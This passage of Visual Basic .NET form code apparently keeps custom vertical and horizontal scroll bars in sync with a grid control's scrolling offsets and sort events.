            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch Exception As System.Exception
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
        End Try
    End Sub
End Class